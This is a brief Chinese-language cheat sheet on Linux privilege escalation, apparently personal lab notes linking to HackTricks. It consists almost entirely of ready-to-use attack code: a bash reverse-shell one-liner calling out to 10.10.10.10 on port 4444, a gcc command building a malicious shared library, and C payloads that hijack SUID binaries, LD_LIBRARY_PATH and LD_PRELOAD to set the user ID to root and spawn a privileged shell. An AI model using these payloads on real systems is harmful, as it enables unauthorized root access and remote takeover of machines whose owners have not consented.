---
    title: linux特权提升
    date: 2021-03-18
---

更多详情看这里:
https://book.hacktricks.xyz/linux-unix/privilege-escalation#groups

```c
bash -i>＆/dev/tcp/10.10.10.10/4444 0>＆1


gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c

//service.c
int main() {
        setuid(0);
        system("/bin/bash -p");
}

// libcalc.c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
        setuid(0);
        system("/bin/bash -p");
}

//user@debian:~/tools$ cat sudo//library_path.c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}

//user@debian:~/tools$ cat sudo/preload.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
        unsetenv("LD_PRELOAD");
        setresuid(0,0,0);
        system("/bin/bash -p");
}

//user@debian:~/tools$ cat suid/service.c
int main() {
        setuid(0);
        system("/bin/bash -p");
}
```

